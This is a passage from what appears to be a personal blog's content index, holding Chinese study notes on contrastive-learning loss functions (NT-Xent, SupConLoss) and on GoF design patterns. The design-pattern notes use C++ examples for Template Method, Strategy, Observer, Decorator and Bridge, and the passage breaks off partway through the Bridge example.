\\tau)}{\\sum^{K}_{i=0}exp(q \\cdot k_i / \\tau)} \\] 分子在最小化损失函数时，会使表征 \\(q\\) 与正例 \\(k_+\\) 的相似度增加。 可以直接使用 PyTorch Metric Learning 包调用损失函数类。 12345from pytorch_metric_learning.losses import NTXentLoss...loss_func = NTXentLoss(temperature=temperature)... 其基本流程如下： 123456789for anchor, positive in pos_pairs: numerator = torch.exp(torch.matmul(anchor, positive) / (temperature * torch.norm(anchor) * torch.norm(positive))) denominator = numerator.clone() for (candidate, negetive) in neg_pairs: tmp = torch.exp(torch.matmul(anchor, negative) / (temperature * torch.norm(anchor) * torch.norm(negative))) denominator += tmp total_loss += -torch.log(numerator / denominator) SupConLoss SupConLoss（Supervised Contrastive）是在监督数据中使用对比学习的损失函数。由于有监督数据的支撑，正例不再来源于样本自身，而且可以来自监督标签中属于同一类的样本。其计算公式的区别也在于多了监督标签的部分。 \\[ L^{sup}= \\sum_{i \\in I} \\frac{-1}{|P(i)|} \\sum_{p \\in P(i)} log \\frac{exp(z_p \\cdot z_i / \\tau)}{ \\sum_{a \\in A(i)} exp(z_a \\cdot z_i / \\tau)} \\] 对每个正例除以包含该正例的positive pairs的数量。具体看代码比较直接。这个公式有两种形式，还有一种是将对 \\(|P(i)|\\) 求平均的操作放置于 log 之内。 可以直接使用 PyTorch Metric Learning 包调用损失函数类。 123from pytorch_metric_learning.losses import SupConLossloss_func = SupConLoss(temperature=temperature) 其基本流程如下： 1234567891011121314losses = torch.zeros(num_of_classes, dtype=torch.float64)for anchor, positive in pos_pairs: numerator = torch.exp(torch.matmul(anchor, positive) / (temperature * torch.norm(anchor) * torch.norm(positive))) denominator = numerator.clone() for (candidate, negetive) in neg_pairs: tmp = torch.exp(torch.matmul(anchor, negative) / (temperature * torch.norm(anchor) * torch.norm(negative))) denominator += tmp losses[anchor_idx] += -torch.log(numerator / denominator)total_loss = torch.mean(losses / num_of_positive_pairs_per_anchor) Gather操作 和之前主题无关，只是记在一起。 1output = tensor.gather(dim, index) tensor与index是两个维度相同的张量。 output中的下标为 (i, j) 的值来自： dim = 0，从tensor中取值时，0维的坐标值来自index张量的 (i, j) 位置的值，1维的坐标值就是 j （output中本来的坐标值）。 dim = 1，从tensor中取值时，1维的坐标值来自index张量的 (i, j) 位置的值，0维的坐标值就是 i （output中本来的坐标值）。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"contrastive learning","slug":"contrastive-learning","permalink":"https://racleray.github.io/tags/contrastive-learning/"}],"author":"HeRui"},{"title":"设计模式Notes","slug":"设计模式Notes","date":"2021-10-25T12:14:37.000Z","updated":"2023-08-07T11:54:31.049Z","comments":true,"path":"posts/97f88c07.html","link":"","permalink":"https://racleray.github.io/posts/97f88c07.html","excerpt":"GOF中23中设计模式整理。","text":"计算机科学中有两种思考方式： 底层思维：向下，把握机器底层从微观理解对象构造。 抽象思维：向上，将问题处理过程抽象为程序代码。 设计模式通过抽象，分离职责，提高复用性。 第一个示例 绘制点或者线，实现方式一，点是点，线是线。 123456789101112131415161718192021222324252627class Point &#123;...&#125;;class Line &#123;...&#125;;class MainForm : public Form &#123; ...;private: vector&lt;Line&gt; lineVector; vector&lt;Rect&gt; rectVector;protected: ... virtual void OnMouseUp(const MouseEventArgs&amp; e); virtual void OnPaint(const PaintEventArgs&amp; e);&#125;;void MainForm::OnMouseUp(const MouseEventArgs&amp; e)&#123; // Point处理代码 ...; // Line处理代码 ...;&#125;void MainForm::OnPaint(const PaintEventArgs&amp; e)&#123; // Point处理代码 ...; // Line处理代码 ...;&#125; 方式二，抽象出Shape基类，在MainForm中统一接口调用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Shape&#123;public: virtual void Draw(const Graphics&amp; g)=0; virtual ~Shape() &#123; &#125;&#125;;class Point: public Shape&#123; // 画点 virtual void Draw(const Graphics&amp; g)&#123; ... &#125;;&#125;;class Line: public Shape&#123; // 画线 virtual void Draw(const Graphics&amp; g)&#123; ... &#125;;&#125;;class MainForm : public Form &#123; ...;private: // 抽象 vector&lt;Shape *&gt; shapes;protected: ... virtual void OnMouseUp(const MouseEventArgs&amp; e); virtual void OnPaint(const PaintEventArgs&amp; e);&#125;;void MainForm::OnMouseUp(const MouseEventArgs&amp; e)&#123; // Shape处理代码 ...;&#125;void MainForm::OnPaint(const PaintEventArgs&amp; e)&#123; // Shape处理代码 ...; for (int i = 0; i &lt; shapes.size(); i++)&#123; shapes[i]-&gt;Draw(e.Graphics); //多态调用 &#125;&#125; 概念 设计模式要解决的能解决的问题，是程序同时有“稳定不变的部分”和“可能发生变化的部分”时，如何提高代码重用性。目标是将变化的部分规约到一起，并使扩展功能变得容易一些。如果只有稳定的部分，不需要设计模式。如果全是变化的部分，使用设计模式并不能到达目的。 面向对象的理解 隔离变化 从宏观层面来看，面向对象的构建方式更能适应软件的变化，能将变化所带来的影响减为最小 各司其职 从微观层面来看，面向对象的方式更强调各个类的“责任” 由于需求变化导致的新增类型不应该影响原来类型的实现——是所谓各负其责 对象是什么 从语言实现层面来看，对象封装了代码和数据。 从规格层面讲，对象是一系列可被使用的公共接口。 从概念层面讲，对象是某种拥有责任的抽象。 一般术语的含义 运行时：程序已经被编译，加载到内存中的二进制形式。 扩展：一般来讲，就是建立新的子类，override父类中提供变化的接口方法。 稳定：一般指代码被编译成二进制之后，不会再改变（或者说很少改变）。不是说一个代码文件中，没有改变的代码片段。 变化：一般时程序中，会随着需求、场景、时间等频繁切换或者改变。这部分会经常要求重新编译。 不可修改：一般就是指源代码不会更改。 接口：一个类（抽象基类）对外开放的方法，一般会有统一的设计准则。 绑定：一般就是指调用关系，一个类中的方法会调用到另一个类中的方法实现。类间可以为父子关系。 原则 依赖倒置原则（DIP） 高层模块(稳定)不应该依赖于低层模块(变化)，二者都应该依赖于抽象(稳定) 。 抽象(稳定)不应该依赖于实现细节(变化) ，实现细节应该依赖于抽象(稳定)。 开放封闭原则（OCP） 对扩展开放，对更改封闭 类模块应该是可扩展的，但是不可修改 单一职责原则（SRP） 一个类应该仅有一个引起它变化的原因 变化的方向隐含着类的责任 Liskov 替换原则（LSP） 子类必须能够替换它们的基类(IS-A) 继承表达类型抽象 接口隔离原则（ISP） 不应该强迫客户程序依赖它们不用的方法 接口应该小而完备 优先使用对象组合，而不是类继承 类继承通常为“白箱复用”，对象组合通常为“黑箱复用” 继承在某种程度上破坏了封装性，子类父类耦合度高 而对象组合则只要求被组合的对象具有良好定义的接口，耦合度低 封装变化点 使用封装来创建对象之间的分界层，让设计者可以在分界层的一侧进行修改，而不会对另一侧产生不良的影响，从而实现层次间的松耦合。 针对接口编程，而不是针对实现编程 不将变量类型声明为某个特定的具体类，而是声明为某个接口 客户程序无需获知对象的具体类型，只需要知道对象所具有的接口 减少系统中各部分的依赖关系，从而实现“高内聚、松耦合”的类型设计方案 很抽象的总结，结合具体模式体会。 分类 从目的来看： 创建型（Creational）模式：将对象的部分创建工作延迟到子类或者其他对象，从而应对需求变化为对象创建时具体类型实现引来的冲击。 结构型（Structural）模式：通过类继承或者对象组合获得更灵活的结构，从而应对需求变化为对象的结构带来的冲击。 行为型（Behavioral）模式：通过类继承或者对象组合来划分类与对象间的职责，从而应对需求变化为多个交互的对象带来的冲击。 从范围来看： 类模式处理类与子类的静态关系。 对象模式处理对象间的动态关系。 从封装变化角度对模式分类： 组件协作： • Template Method • Observer / Event • Strategy 单一职责： • Decorator • Bridge 对象创建: • Factory Method • Abstract Factory • Prototype • Builder 对象性能： • Singleton • Flyweight 接口隔离: • Façade • Proxy • Mediator • Adapter 状态变化： • Memento • State 数据结构： • Composite • Iterator • Chain of Responsibility 行为变化： • Command • Visitor 领域问题： • Interpreter 现代软件设计的特征是“需求的频繁变化”。设计模式的要点是“寻找变化点，然后在变化点处应用设计模式，从而来更好地应对需求的变化”。“什么时候、什么地点应用设计模式”比“理解设计模式结构本身”更为重要。 设计模式的应用不宜先入为主，一上来就使用设计模式是对设计模式的最大误用。没有一步到位的设计模式。敏捷软件开发实践提倡的“Refactoring to Patterns”是目前普遍公认的最好的使用设计模式的方法。 重构技法 静态 转 动态 早绑定 转 晚绑定 继承 转 组合 编译时依赖 转 运行时依赖 紧耦合 转 松耦合 虽然表述上不同，但是实质上意思是类似的。 组件协作相关模式 现代软件专业分工之后的第一个结果是“框架与应用程序的划分”，“组件协作”模式通过晚绑定（父类中调用子类的方法实现，虚函数实现），来实现框架与应用程序之间的松耦合，是二者之间协作时常用的模式。 典型模式： Template Method Observer / Event Strategy Template Method 对于某一项任务，它常常有稳定的整体操作结构，但各个子步骤却有很多改变的需求，或者由于固有的原因（比如框架与应用之间的关系）而无法和任务的整体结构同时实现。 在确定稳定操作结构的前提下，来灵活应对各个子步骤的变化或者晚期实现需求。 示例2 设计一个library，支持application在使用时可以自定义框架中的某些步骤。 实现一，Application实现过程还需要完成main函数中调用library，并完成算法逻辑的过程。 123456789101112131415161718192021222324252627class Library&#123;public: void Step1()&#123;...&#125; void Step3()&#123;...&#125; void Step5()&#123;...&#125;&#125;;class Application&#123;public: bool Step2()&#123;...&#125; void Step4()&#123;...&#125;&#125;;int main()&#123; Library lib(); Application app(); lib.Step1(); if (app.Step2())&#123; lib.Step3(); &#125; for (int i = 0; i &lt; 4; i++)&#123; app.Step4(); &#125; lib.Step5();&#125; 实现二，利用虚函数，将固定的算法逻辑在lib中实现，运行时调用App中实现的override的自定义步骤。 12345678910111213141516171819202122232425262728293031323334353637383940class Library&#123;public: //稳定 template method void Run()&#123; Step1(); if (Step2()) Step3(); for (int i = 0; i &lt; 4; i++) Step4(); Step5(); &#125; virtual ~Library()&#123; &#125;protected: void Step1() &#123; 稳定 &#125; void Step3() &#123; 稳定 &#125; void Step5() &#123; 稳定 &#125; // 一般设置为protected virtual bool Step2() = 0;//变化,虚函数的多态调用 virtual void Step4() =0; //变化&#125;;class Application : public Library &#123;protected: virtual bool Step2()&#123; //... 子类重写实现 &#125; virtual void Step4() &#123; //... 子类重写实现 &#125;&#125;;int main()&#123; Library* pLib=new Application(); lib-&gt;Run(); delete pLib;&#125; 实际上就是个虚函数的应用。这里的第一种为早绑定，在app程序中，实现固定不变的流程，并调用lib中的方法。第二种是晚绑定，固定流程实现在lib中，app只关心变化的部分，实现自定义的方法即可，从lib中延迟调用app实现的自定义方法。 ConcreteClass靠AbstractClass来实现算法中不变的步骤。 抽象代码结构 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;/* * AbstractClass * implements a template method defining the skeleton of an algorithm */class AbstractClass&#123;public: virtual ~AbstractClass() &#123;&#125; void templateMethod() &#123; // ... primitiveOperation1(); // ... primitiveOperation2(); // ... &#125; virtual void primitiveOperation1() = 0; virtual void primitiveOperation2() = 0; // ...&#125;;/* * Concrete Class * implements the primitive operations to carry out specific steps * of the algorithm, there may be many Concrete classes, each implementing * the full set of the required operation */class ConcreteClass : public AbstractClass&#123;public: ~ConcreteClass() &#123;&#125; void primitiveOperation1() &#123; std::cout &lt;&lt; \"Primitive operation 1\" &lt;&lt; std::endl; // ... &#125; void primitiveOperation2() &#123; std::cout &lt;&lt; \"Primitive operation 2\" &lt;&lt; std::endl; // ... &#125; // ...&#125;;int main()&#123; AbstractClass *tm = new ConcreteClass; tm-&gt;templateMethod(); delete tm; return 0;&#125; Strategy 在软件构建过程中，某些对象使用的算法可能多种多样，经常改变，如果将这些算法都编码到对象中，将会使对象变得异常复杂；而且有时候支持不使用的算法也是一个性能负担。 Strategy将算法与对象本身解耦。 Strategy表述为： 定义一系列算法，把它们一个个封装起来，并且使它们可互相替换（变化）。该模式使得算法可独立于使用它的客户程序(稳定)而变化（扩展，子类化）。 示例3 设计一个计税程序，根据不同国家税法，进行计算。 方法一，使用 if else 结构，将不同方法整合再一个对象中。 12345678910111213141516171819202122enum TaxBase &#123; CN_Tax, US_Tax, DE_Tax, FR_Tax //扩展&#125;;class SalesOrder&#123; TaxBase tax;public: double CalculateTax()&#123; ... if (tax == CN_Tax)&#123;...&#125; else if (tax == US_Tax)&#123;...&#125; else if (tax == DE_Tax)&#123;...&#125; // 扩展更多情况，需要修改源代码，重新编译 else if (tax == FR_Tax)&#123; ... &#125; ... &#125;&#125;; 方法二，使用类实现不同策略，在应用程序部分实现不变化的部分。 12345678910111213141516171819202122232425262728// 策略基类class TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)=0; virtual ~TaxStrategy()&#123;&#125;&#125;;class CNTax : public TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)&#123;...&#125;&#125;;class USTax : public TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)&#123;...&#125;&#125;;class DETax : public TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)&#123;...&#125;&#125;;//扩展新策略class FRTax : public TaxStrategy&#123;public: virtual double Calculate(const Context&amp; context)&#123;...&#125;&#125;; 1234567891011121314151617181920// 稳定的流程部分class SalesOrder&#123;private: TaxStrategy* strategy;public: SalesOrder(StrategyFactory* strategyFactory)&#123; this-&gt;strategy = strategyFactory-&gt;NewStrategy(); &#125; ~SalesOrder()&#123; delete this-&gt;strategy; &#125; public double CalculateTax()&#123; //... Context context(); double val = strategy-&gt;Calculate(context); //多态调用 //... &#125;&#125;; 实现不同策略类，通过工厂模式传入策略，保持了稳定的流程部分不会改变。 这里的代码整合到了一起，实际上是在不同的文件中。 一般if else涉及多种场景切换且可能出现扩展需求的地方，都可以考虑使用strategy模式。更多的strategy对象，可能存在一些额外的开销，可以考虑设计为singleton模式。这样不同的context也可以共享一个strategy对象，节省了开销。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;iostream&gt;/* * Strategy * declares an interface common to all supported algorithms */class Strategy&#123;public: virtual ~Strategy() &#123; /* ... */ &#125; virtual void algorithmInterface() = 0; // ...&#125;;/* * Concrete Strategies * implement the algorithm using the Strategy interface */class ConcreteStrategyA : public Strategy&#123;public: ~ConcreteStrategyA() &#123; /* ... */ &#125; void algorithmInterface() &#123; std::cout &lt;&lt; \"Concrete Strategy A\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteStrategyB : public Strategy&#123;public: ~ConcreteStrategyB() &#123; /* ... */ &#125; void algorithmInterface() &#123; std::cout &lt;&lt; \"Concrete Strategy B\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteStrategyC : public Strategy&#123;public: ~ConcreteStrategyC() &#123; /* ... */ &#125; void algorithmInterface() &#123; std::cout &lt;&lt; \"Concrete Strategy C\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Context * maintains a reference to a Strategy object */class Context&#123;public: Context( Strategy* const s ) : strategy( s ) &#123;&#125; ~Context() &#123; delete strategy; &#125; void contextInterface() &#123; strategy-&gt;algorithmInterface(); &#125; // ...private: Strategy *strategy; // ...&#125;;int main()&#123; Context context( new ConcreteStrategyA() ); context.contextInterface(); return 0;&#125; Observer 在软件构建过程中，我们需要为某些对象建立一种“通知依赖关系” ——一个对象（目标对象）的状态发生改变，所有的依赖对象（观察者对象）都将得到通知。 定义描述： 定义对象间的一种一对多（变化）的依赖关系，以便当一个对象(Subject)的状态发生改变时，所有依赖于它的对象都得到通知并自动更新。 比如，当用户改变表格中的信息时, 柱状图能立即反映这一变化。 示例4 在一个大文件切分为小文件储存的过程中，增加不同的进度条显示。 方法一，直接在FileSpliter类中，调用进度条管理对象。 1234567891011121314151617181920212223class FileSplitter&#123; string m_filePath; int m_fileNumber; ProgressBar* m_progressBar; // 直接调用具体的进度条管理对象public: FileSplitter(const string&amp; filePath, int fileNumber, ProgressBar* progressBar) : m_filePath(filePath), m_fileNumber(fileNumber), m_progressBar(progressBar)&#123;...&#125; void split()&#123; ... // 直接调用具体对象方法，更新进度条 for (int i = 0; i &lt; m_fileNumber; i++)&#123; //... progressValue = (i + 1) / (float)progressValue; m_progressBar-&gt;setValue(progressValue); &#125; ... &#125;&#125;; 1234567891011121314151617class MainForm : public Form&#123; TextBox* txtFilePath; TextBox* txtFileNumber; ProgressBar* progressBar;public: void Button1_Click()&#123; string filePath = txtFilePath-&gt;getText(); int number = atoi(txtFileNumber-&gt;getText().c_str()); // 具体对象传入 FileSplitter splitter(filePath, number, progressBar); splitter.split(); &#125;&#125;; 以上实现，FileSplitter不能传入其它类型的进度条对象。不符合依赖倒置原则。 高层模块(稳定)不应该依赖于低层模块(变化)，二者都应该依赖于抽象(稳定) 。 抽象(稳定)不应该依赖于实现细节(变化) ，实现细节应该依赖于抽象(稳定)。 要改，就是将具体进度条对象，想办法变成一个抽象的父类对象。 方法二，使用observer，抽象一个IProgress基类对象，让FileSpliter依赖它。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// observerclass IProgress&#123;public: // update virtual void DoProgress(float value)=0; virtual ~IProgress()&#123;&#125;&#125;;// subjectclass FileSplitter&#123; string m_filePath; int m_fileNumber; List&lt;IProgress*&gt; m_iprogressList; // 抽象通知机制，支持多个观察者 public: FileSplitter(const string&amp; filePath, int fileNumber) : m_filePath(filePath), m_fileNumber(fileNumber)&#123;...&#125; // 调用notifier: 所有具体observer，更新状态，此处不依赖具体对象 void split()&#123; ... for (int i = 0; i &lt; m_fileNumber; i++)&#123; progressValue = (i + 1) / (float)progressValue; onProgress(progressValue); //发送通知 &#125; ... &#125; // attach observer void addIProgress(IProgress* iprogress)&#123; m_iprogressList.push_back(iprogress); &#125; // detach observer void removeIProgress(IProgress* iprogress)&#123; m_iprogressList.remove(iprogress); &#125;protected: // notify virtual void onProgress(float value)&#123; List&lt;IProgress*&gt;::iterator itor=m_iprogressList.begin(); while (itor != m_iprogressList.end() ) (*itor)-&gt;DoProgress(value); //调用observer更新进度条 itor++; &#125; &#125;&#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142// 一种具体observerclass ConsoleObserver: public IProgress &#123;public: virtual void DoProgress(float value)&#123; cout &lt;&lt; \".\"; &#125;&#125;;// 具体对象使用observer进行通知class MainForm : public Form, public IProgress&#123; TextBox* txtFilePath; TextBox* txtFileNumber; ProgressBar* progressBar;public: void Button1_Click()&#123; string filePath = txtFilePath-&gt;getText(); int number = atoi(txtFileNumber-&gt;getText().c_str()); // 具体observer ConsoleObserver ob1; // 具体subject FileSplitter splitter(filePath, number); // 添加observer splitter.addIProgress(this); //订阅通知 splitter.addIProgress(&amp;ob1)； //订阅通知 // observer将根据subject状态的改变，更新自己状态 splitter.split(); splitter.removeIProgress(&amp;ob1); splitter.removeIProgress(this); &#125; // 在mainform中更新 virtual void DoProgress(float value)&#123; progressBar-&gt;setValue(value); &#125;&#125;; 以上抽象出一个observer基类，由subject进行状态的传递，解耦了进度条对象大的设计。 Subject（目标） —目标知道它的观察者。可以有任意多个观察者观察同一个目标。 —提供注册和删除观察者对象的接口。 Observer（观察者） —为那些在目标发生改变时需获得通知的对象定义一个更新接口。 ConcreteSubject（具体目标） —将有关状态存入各ConcreteObserver对象。 —当它的状态发生改变时,向它的各个观察者发出通知。 ConcreteObserver（具体观察者） —维护一个指向ConcreteSubject对象的引用。 —存储有关状态，这些状态应与目标的状态保持一致。 —实现Observer的更新接口以使自身状态与目标的状态保持一致。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include &lt;iostream&gt;#include &lt;vector&gt;class Subject;/* * Observer * defines an updating interface for objects that should be notified * of changes in a subject */class Observer&#123;public: virtual ~Observer() &#123;&#125; virtual int getState() = 0; virtual void update( Subject *subject ) = 0; // ...&#125;;/* * Concrete Observer * stores state of interest to ConcreteObserver objects and * sends a notification to its observers when its state changes */class ConcreteObserver : public Observer&#123;public: ConcreteObserver( const int state ) : observer_state( state ) &#123;&#125; ~ConcreteObserver() &#123;&#125; int getState() &#123; return observer_state; &#125; void update( Subject *subject ); // ...private: int observer_state; // ...&#125;;/* * Subject * knows its observers and provides an interface for attaching * and detaching observers */class Subject&#123;public: virtual ~Subject() &#123;&#125; void attach( Observer *observer ) &#123; observers.push_back(observer); &#125; void detach( const int index ) &#123; observers.erase( observers.begin() + index ); &#125; void notify() &#123; for ( unsigned int i = 0; i &lt; observers.size(); i++ ) &#123; observers.at( i )-&gt;update( this ); &#125; &#125; virtual int getState() = 0; virtual void setState( const int s ) = 0; // ...private: std::vector&lt;Observer*&gt; observers; // ...&#125;;/* * Concrete Subject * stores state that should stay consistent with the subject's */class ConcreteSubject : public Subject&#123;public: ~ConcreteSubject() &#123;&#125; int getState() &#123; return subject_state; &#125; void setState( const int s ) &#123; subject_state = s; &#125; // ... private: int subject_state; // ...&#125;;void ConcreteObserver::update( Subject *subject )&#123; observer_state = subject-&gt;getState(); std::cout &lt;&lt; \"Observer state updated.\" &lt;&lt; std::endl;&#125;int main()&#123; ConcreteObserver observer1( 1 ); ConcreteObserver observer2( 2 ); std::cout &lt;&lt; \"Observer 1 state: \" &lt;&lt; observer1.getState() &lt;&lt; std::endl; std::cout &lt;&lt; \"Observer 2 state: \" &lt;&lt; observer2.getState() &lt;&lt; std::endl; Subject *subject = new ConcreteSubject(); subject-&gt;attach( &amp;observer1 ); subject-&gt;attach( &amp;observer2 ); subject-&gt;setState( 10 ); subject-&gt;notify(); std::cout &lt;&lt; \"Observer 1 state: \" &lt;&lt; observer1.getState() &lt;&lt; std::endl; std::cout &lt;&lt; \"Observer 2 state: \" &lt;&lt; observer2.getState() &lt;&lt; std::endl; delete subject; return 0;&#125; 单一职责相关模式 在软件组件的设计中，如果责任划分的不清晰，使用继承得到的结果往往是随着需求的变化，子类急剧膨胀，同时充斥着重复代码，这时候的关键是划清责任。 典型模式 Decorator Bridge Decorator 使用继承来扩展对象的功能，为类型引入的静态特质，使得这种扩展方式缺乏灵活性； 并且随着子类的增多（扩展功能的增多），各种子类的组合（扩展功能的组合）会导致更多子类的膨胀。 动态（组合）地给一个对象增加一些额外的职责。就增加功能而言，Decorator模式比生成子类（继承）更为灵活（消除重复代码 &amp; 减少子类个数）。 示例5 设计一个数据流处理系统，后续在基础系统之上，扩展不同类型的流，以及增加加密、缓存功能。 实现一，使用类继承的方式： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// 基类class Stream&#123;public： virtual char Read(int number)=0; virtual void Seek(int position)=0; virtual void Write(char data)=0; virtual ~Stream()&#123;&#125;&#125;;// 2种流数据class FileStream: public Stream&#123;public: virtual char Read(int number)&#123;读文件流&#125; virtual void Seek(int position)&#123;定位文件流&#125; virtual void Write(char data)&#123;写文件流&#125;&#125;;class NetworkStream :public Stream&#123;public: virtual char Read(int number)&#123;读网络流&#125; virtual void Seek(int position)&#123;定位网络流&#125; virtual void Write(char data)&#123;写网络流&#125;&#125;;// 扩展功能class CryptoFileStream :public FileStream&#123;public: virtual char Read(int number)&#123; //额外的加密操作... FileStream::Read(number);//读文件流 &#125; virtual void Seek(int position)&#123; //额外的加密操作... FileStream::Seek(position);//定位文件流 //额外的加密操作... &#125; virtual void Write(byte data)&#123; //额外的加密操作... FileStream::Write(data);//写文件流 //额外的加密操作... &#125;&#125;;class CryptoNetworkStream : :public NetworkStream&#123;public: virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;;class BufferedFileStream : public FileStream&#123; virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;;class BufferedNetworkStream : public NetworkStream&#123; virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;;class CryptoBufferedFileStream :public FileStream&#123;public: virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;; 大量重复代码，类数量随功能数增长很快。 实现二，使用组合而不是继承。将功能抽象成一种装饰类。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// 基类class Stream&#123;public： virtual char Read(int number)=0; virtual void Seek(int position)=0; virtual void Write(char data)=0; virtual ~Stream()&#123;&#125;&#125;;// 2种流数据class FileStream: public Stream&#123;public: virtual char Read(int number)&#123;读文件流&#125; virtual void Seek(int position)&#123;定位文件流&#125; virtual void Write(char data)&#123;写文件流&#125;&#125;;class NetworkStream :public Stream&#123;public: virtual char Read(int number)&#123;读网络流&#125; virtual void Seek(int position)&#123;定位网络流&#125; virtual void Write(char data)&#123;写网络流&#125;&#125;;// 组合而不是继承// public Stream继承是为了规范接口；而Stream* stream成员是装饰组合的关键class CryptoStream: public Stream &#123;private: Stream* stream;public: CryptoStream(Stream* stream):stream(stream)&#123;...&#125; virtual char Read(int number)&#123; //额外的加密操作... stream-&gt;Read(number);//读文件流 &#125; virtual void Seek(int position)&#123; //额外的加密操作... stream::Seek(position);//定位文件流 //额外的加密操作... &#125; virtual void Write(byte data)&#123; //额外的加密操作... stream::Write(data);//写文件流 //额外的加密操作... &#125;&#125;;class BufferedStream : public Stream&#123;private: Stream* stream; public: BufferedStream(Stream* stream):stream(stream)&#123;&#125; virtual char Read(int number)&#123; //额外的缓冲操作... stream-&gt;Read(number);//读文件流 &#125; virtual void Seek(int position)&#123; //额外的缓冲操作... stream::Seek(position);//定位文件流 //额外的缓冲操作... &#125; virtual void Write(byte data)&#123; //额外的缓冲操作... stream::Write(data);//写文件流 //额外的缓冲操作... &#125;&#125;;int main()&#123; FileStream* s1=new FileStream(); CryptoStream* s2=new CryptoStream(s1); BufferedStream* s3=new BufferedStream(s1); BufferedStream* bufferedCryptoStm=new BufferedStream(s2);&#125; 实现三，将拥有共同成员的BufferedStream和CryptoStream再抽象出一个父类。 123456789101112131415161718192021222324252627282930313233343536// 基类class Stream&#123; ...&#125;;// 2种流数据class FileStream: public Stream&#123; ...&#125;;class NetworkStream :public Stream&#123; ...&#125;;// 抽象一个父类DecoratorStream: public Stream&#123;protected: Stream* stream; DecoratorStream(Stream * stm):stream(stm)&#123;...&#125;&#125;;class CryptoStream: public DecoratorStream &#123;public: CryptoStream(Stream* stream):DecoratorStream(stream)&#123;...&#125; virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;;class BufferedStream : public DecoratorStream&#123;public: BufferedStream(Stream* stream):DecoratorStream(stream)&#123;&#125; virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;; 以下情况使用 Decorator模式 在不影响其他对象的情况下，以动态、透明的方式给单个对象添加职责。 处理那些可以撤消的职责。 当不能采用生成子类的方法进行扩充时。一种情况是，可能有大量独立的扩展，为支持每一种组合将产生大量的子类，使得子类数目呈爆炸性增长。另一种情况可能是因为类定义被隐藏，或类定义不能用于生成子类。 抽象结构如下： 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;iostream&gt;/* * Component * defines an interface for objects that can have responsibilities * added to them dynamically */class Component&#123;public: virtual ~Component() &#123;&#125; virtual void operation() = 0; // ...&#125;;/* * Concrete Component * defines an object to which additional responsibilities * can be attached */class ConcreteComponent : public Component&#123;public: ~ConcreteComponent() &#123;&#125; void operation() &#123; std::cout &lt;&lt; \"Concrete Component operation\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Decorator * maintains a reference to a Component object and defines an interface * that conforms to Component's interface */class Decorator : public Component&#123;public: ~Decorator() &#123;&#125; Decorator( Component *c ) : component( c ) &#123;&#125; virtual void operation() &#123; component-&gt;operation(); &#125; // ...private: Component *component;&#125;;/* * Concrete Decorators * add responsibilities to the component (can extend the state * of the component) */class ConcreteDecoratorA : public Decorator&#123;public: ConcreteDecoratorA( Component *c ) : Decorator( c ) &#123;&#125; void operation() &#123; Decorator::operation(); std::cout &lt;&lt; \"Decorator A\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteDecoratorB : public Decorator&#123;public: ConcreteDecoratorB( Component *c ) : Decorator( c ) &#123;&#125; void operation() &#123; Decorator::operation(); std::cout &lt;&lt; \"Decorator B\" &lt;&lt; std::endl; &#125; // ...&#125;;int main()&#123; ConcreteComponent *cc = new ConcreteComponent(); ConcreteDecoratorB *db = new ConcreteDecoratorB( cc ); ConcreteDecoratorA *da = new ConcreteDecoratorA( db ); Component *component = da; component-&gt;operation(); delete da; delete db; delete cc; return 0;&#125; 通过采用组合而非继承的手法， Decorator模式实现了在运行时动态扩展对象功能的能力，而且可以根据需要扩展多个功能。 Decorator类在接口上表现为is-a Component的继承关系，即Decorator类继承了Component类所具有的接口。但在实现上又表现为has-a Component的组合关系，即Decorator类又使用了另外一个Component类。 Bridge 将抽象部分(业务功能)与实现部分(平台实现)分离，使它们都可以独立地变化。 简单来讲，就是将变化划分成不同的类别，通过父类统一某一类变化的接口。通过组合抽象父类的指针成员，达到简化代码的目的。有点抽象，看示例。 示例6 实现一个消息通知程序，再不同的使用平台，有不同的表现形式。 实现一，通过类继承，达到适应不同平台的目的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// 纯虚基类class Messager&#123;public: virtual void Login(string username, string password)=0; virtual void SendMessage(string message)=0; virtual void SendPicture(Image image)=0; virtual void PlaySound()=0; virtual void DrawShape()=0; virtual void WriteText()=0; virtual void 